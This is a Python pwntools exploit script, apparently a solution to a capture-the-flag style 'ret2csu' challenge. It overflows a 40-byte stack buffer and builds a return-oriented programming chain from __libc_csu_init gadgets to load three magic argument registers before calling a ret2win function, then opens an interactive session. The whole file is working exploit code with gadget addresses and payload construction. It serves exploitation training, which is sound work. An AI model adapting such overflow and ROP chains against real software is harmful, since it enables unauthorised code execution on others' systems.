#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
tb *(pwnme+151)
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    ### attack
    key1 = p64(0xdeadbeefdeadbeef) # rdi
    key2 = p64(0xcafebabecafebabe) # rsi
    key3 = p64(0xd00df00dd00df00d) # rdx

    g1 = p64(0x40069a) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
    g2 = p64(0x400680) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]

    # 512 bytes are read, 40th byte causes overflow
    garbage = p8(0x41)*40
    
    rop = b""

    # the tricky thing is that we cannot call ret2win just yet, the mov edi, r13d will clobber the key
    # call g1 from __libc_csu_init
    rop += g1
    rop += p64(0) # rbx
    rop += p64(1) # rbp: needs to be 1 to escape the loop
    rop += p64(0x600df8) # r12 -> __do_global_dtors_aux, randomly picked ptr that doesn't do much demage
    rop += key1   # r13 -> rdi
    rop += key2   # r14 -> rsi
    rop += key3   # r15 -> rdx

    # call g2 to transfer regs to rdi and rsi - some of them AGAIN
    rop += g2
    rop += p64(0) # for add rsp, 8
    rop += p64(0) # rbx
    rop += p64(0) # rbp
    rop += p64(0) # r12
    rop += p64(0) # r13
    rop += p64(0) # r14
    rop += p64(0) # r15

    rop += p64(0x4006a3) # pop rdi; ret
    rop += key1

    rop += p64(elf.plt['ret2win'])

    payload = garbage + rop
    send(payload)

    ### shell
    io.interactive()
